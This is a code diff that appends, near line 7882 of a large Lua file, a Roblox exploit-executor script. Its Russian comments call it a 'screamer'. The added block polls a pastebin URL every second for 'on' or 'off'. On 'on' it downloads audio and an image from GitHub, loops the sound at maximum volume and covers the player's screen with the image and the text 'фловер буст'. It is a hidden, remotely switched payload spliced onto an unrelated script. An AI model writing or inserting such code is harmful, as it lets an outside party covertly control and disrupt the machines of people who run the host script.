@@ -7882,4 +7882,112 @@ task.spawn(function()
     while task.wait(CHECK_INTERVAL) do
         checkStatus()
     end
+end)-- This file was generated with SKS V1.2.0
+-- Модифицировано: проверка pastebin на "on"/"off" с автообновлением
+
+local fenv = getfenv()
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+-- ============ НАСТРОЙКИ ============
+local PASTEBIN_URL = "https://pastebin.com/raw/SWQZAFMn"
+local CHECK_INTERVAL = 1 -- секунд между проверками
+
+-- ============ СОСТОЯНИЕ ============
+local isActive = false
+local screenGui = nil
+local sound = nil
+
+-- ============ ФУНКЦИЯ ПОЛУЧЕНИЯ СТАТУСА ============
+local function getStatus()
+    local ok, result = pcall(function()
+        return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
+    end)
+    if not ok or not result then
+        return nil
+    end
+    -- нормализуем: убираем пробелы, переносы, приводим к нижнему регистру
+    local cleaned = result:gsub("%s+", ""):lower()
+    if cleaned:find("on") then
+        return "on"
+    elseif cleaned:find("off") then
+        return "off"
+    end
+    return nil
+end
+
+-- ============ ВКЛЮЧЕНИЕ СКРИМЕРА ============
+local function activate()
+    if isActive then return end
+    isActive = true
+
+    -- Звук
+    writefile(
+        "po.mp3",
+        game:HttpGet("https://github.com/user-attachments/files/32200757/ScreenRecording_09-14-2026.22-15-04_1.mp3")
+    )
+    sound = Instance.new("Sound")
+    sound.Parent = workspace
+    sound.SoundId = fenv.getcustomasset("po.mp3")
+    sound.Volume = 10
+    sound.Looped = true
+    sound:Play()
+
+    -- Картинка
+    writefile(
+        "dsf.jpg",
+        game:HttpGet("https://github.com/user-attachments/assets/fae08c69-5646-4845-83a1-be9b12afe943")
+    )
+    screenGui = Instance.new("ScreenGui")
+    screenGui.DisplayOrder = 999
+    screenGui.Parent = Players.LocalPlayer.PlayerGui
+
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.Image = fenv.getcustomasset("dsf.jpg")
+    imageLabel.Size = UDim2.new(0, 600, 0, 600)
+    imageLabel.BackgroundTransparency = 1
+    imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    imageLabel.Parent = screenGui
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Text = "фловер буст"
+    textLabel.TextScaled = true
+    textLabel.Size = UDim2.new(0, 200, 0, 100)
+    textLabel.TextColor3 = Color3.new(1, 1, 1)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    textLabel.ZIndex = 999
+    textLabel.Parent = screenGui
+end
+
+-- ============ ВЫКЛЮЧЕНИЕ СКРИМЕРА ============
+local function deactivate()
+    if not isActive then return end
+    isActive = false
+
+    if sound then
+        pcall(function() sound:Stop() end)
+        pcall(function() sound:Destroy() end)
+        sound = nil
+    end
+
+    if screenGui then
+        pcall(function() screenGui:Destroy() end)
+        screenGui = nil
+    end
+end
+
+-- ============ ЦИКЛ ПРОВЕРКИ ============
+task.spawn(function()
+    while true do
+        local status = getStatus()
+        if status == "on" then
+            activate()
+        elseif status == "off" then
+            deactivate()
+        end
+        task.wait(CHECK_INTERVAL)
+    end
 end)
